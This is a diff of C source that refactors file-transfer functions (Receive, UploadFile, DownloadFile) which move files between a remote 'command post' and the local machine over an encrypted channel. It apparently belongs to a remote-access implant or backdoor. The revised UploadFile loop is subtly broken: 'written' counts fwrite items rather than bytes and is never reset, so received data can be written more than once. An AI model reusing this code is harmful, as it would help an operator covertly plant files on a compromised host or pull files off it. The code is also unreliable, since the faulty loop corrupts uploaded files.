@@ -81,8 +81,15 @@ int write_all( int fd, void *ptr, int n )
 	return ( n - nleft );
 }
 
-//******************************************************************
-//Waits for data to arrive on the socket and reads it in until the buffer is full.
+/*!
+ * Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
+ * @brief Waits for data to arrive on the socket and reads it in until the buffer is full.
+ * @param sock - socket on which to receive
+ * @param buf - receiving buffer
+ * @param size - size of receiving buffer
+ * @param timeOut - Stop and return on timeout.
+ * @return
+ */
 int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
 {
 	unsigned long		receivedTotal = 0;
@@ -115,23 +122,26 @@ int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long time
 }
 
 //******************************************************************
+/*!
+ * Upload a file from the command post to a local file
+ * @param path - path and filename of the local file
+ * @param size - size of the file
+ * @param sock - socket
+ * @return - Success = 0, Failure = -1
+ */
 int UploadFile(char* path, unsigned long size, int sock)
 {
 	REPLY ret;					// Reply struct
 	DATA data;					// File transfer Data struct
-	unsigned long retVal;
-//	D( unsigned long written; )
+	int retval;
+	int bytes_read = 0;
+	unsigned int received = 0, written = 0;
 
 	FILE* fd;
 
-	// Fill reply with random bytes
- 	GenRandomBytes((unsigned char *)&ret, sizeof(ret));
-
 	// Attempt to create local file
-	
 	fd = fopen(path,"wb");
-	if(fd == 0)
-	{
+	if(fd == 0) {
 		return errno;
 	}
 	DLX(2, printf("Opened path: %s\n", path));
@@ -139,59 +149,53 @@ int UploadFile(char* path, unsigned long size, int sock)
 	// Set successful reply
 	ret.reply = 0;
 
-	retVal = 0;
-
 	//send reply (guessing it lets client know we are ready to receive data of file?)
 //	if(SOCKET_ERROR == send(sock,(const char*) &ret, sizeof(REPLY),0))
 	// TODO <= 0
-	if (crypt_write(&trig_ssl, (unsigned char*) &ret, sizeof(REPLY)) < 0)
-	{
-		retVal = -1;
+	if (crypt_write(&trig_ssl, (unsigned char*) &ret, sizeof(REPLY)) < 0) {
 		goto Error;
 	}
-
-	DLX(2, printf("Acknowledged UploadFile command of size %d\n", (int)size));
+	DLX(2, printf("Acknowledged UploadFile with file size of %lu bytes\n", size));
 	
-	while (size)
-	{
-//		D( printf( " DEBUG: %d bytes remaining\n", (int)size ); )
-		// Read 4k block of file data from client
-		// minimum is one 4k block
-		// TODO: do we need to call Receive() or just call crypt_read() directly??
-		if ( SOCKET_ERROR == Receive(sock,(unsigned char*) &data, sizeof(DATA), PKT_TIMEOUT))
+	while (received < size) {
+		// Read bytes from network
+		if ((bytes_read = Receive(sock,(unsigned char*) &data, (size-received > sizeof(DATA)) ? sizeof(DATA) : size-received, PKT_TIMEOUT)) < 0) {
+			DLX(4, printf("ERROR: Receive()\n"));
 			goto Error;
-		
-		if (size > sizeof(DATA))
-		{
-			// Write block
-			(void) fwrite( data.data, sizeof(DATA), 1, fd );
-//			written = fwrite( data.data, sizeof(DATA), 1, fd );
-//			D( printf( " DEBUG: %d bytes written\n", (int)written ); )
-			size -= sizeof(DATA);
 		}
-		else
-		{
-			// Write remaining bytes
-			(void) fwrite( data.data, size, 1, fd );
-//			written = fwrite( data.data, size, 1, fd );
-//			D( printf( " DEBUG: %d bytes written\n", (int)written ); )
-			size = 0;
+		DLX(8, printf("Receive() bytes_read: %d\n", bytes_read));
+		// Write bytes to file
+		while (written < (unsigned int)bytes_read) {
+			if ((retval = fwrite( data.data, bytes_read, 1, fd )) == 0) {
+				if (ferror(fd)) {
+					DLX(4, printf("ERROR: fwrite()\n"));
+					goto Error;
+				}
+				break;
+			}
+			written += retval;
 		}
-		
+		received += bytes_read;
+		DLX(8, printf("Bytes received: %u\n", received));
 	}
 
 	fclose(fd);
-	// TODO: what do we want retVal to be? 0 on success?
-	return retVal;
+	return 0;
 
 Error:
-	retVal = -1;
 	fclose(fd);
 	unlink(path);
-	return retVal;
+	return -1;
 }
 
 //******************************************************************
+/*!
+ * Download a file from the local system to the command post
+ * @param path - complete path and filename
+ * @param size - size of file
+ * @param sock - socket
+ * @return
+ */
 int DownloadFile(char *path, unsigned long size, int sock)
 {
 	REPLY ret;		// Reply struct
